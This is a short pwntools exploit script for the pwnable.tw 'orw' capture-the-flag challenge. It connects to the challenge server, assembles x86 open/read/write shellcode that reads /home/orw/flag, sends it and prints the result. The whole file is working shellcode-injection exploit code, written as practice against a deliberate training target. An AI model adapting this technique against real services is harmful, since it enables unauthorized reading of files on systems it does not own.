#!/usr/bin/env python
from pwn import *
import pwnlib.shellcraft

c = remote('chall.pwnable.tw', 10001)
# note: only remote working
# c = process("./orw")

context.os='linux'
context.arch='x86'
context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)
context.log_level ='debug'

# open /home/orw/flag
ans = shellcraft.open('/home/orw/flag')
#ans = shellcraft.open('./flag')

# read
# syscall ret to eax
ans += 'sub sp, 0x111'
ans += shellcraft.read('eax', 'esp', 0x111)

# write
ans += shellcraft.write(1, 'esp', 0x111)

c.sendline(asm(ans))

print(c.recv())
c.close()
